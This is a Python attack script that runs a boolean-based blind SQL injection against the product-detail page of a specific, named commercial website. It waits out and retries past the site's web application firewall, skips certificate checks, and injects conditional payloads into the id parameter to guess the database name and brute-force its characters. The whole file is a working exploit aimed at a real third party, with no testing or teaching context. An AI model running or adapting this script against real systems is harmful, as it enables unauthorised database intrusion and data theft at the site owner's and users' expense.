#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(3):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(3); continue
        if 'Invalid SQL' in b:
            return None
        return TRUE_MARK in b
    return None

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(0.3)
    return r

# 候选库名(长度9)
cands = ['yijingweb', 'yijing_wb', 'yjweb_com', 'yijingcom', 'hxz_spool',
         'yijing888', 'web_yijing', 'yijing201', 'yijingweb1']
print('=== 测试候选库名(长度9) ===')
for c in cands:
    if len(c) != 9:
        continue
    r = test("database()=%s" % c)  # 直接database()=库名
    if r is None:
        r = test("substr(database(),1,9)='%s'" % c)  # 用substr绕过
    print('  %s -> %s' % (c, r))
    if r is True:
        print('*** 命中! database() = %s ***' % c)
        break

# 如果都没命中, 测首字符ascii(扩展范围128-255)
print('=== 首字符ascii 128-255 ===')
for n in range(128, 256):
    r = test("ascii(substr(database(),1,1))=%d" % n)
    if r is True:
        print('首字符ascii = %d (0x%x)' % (n, n))
        break
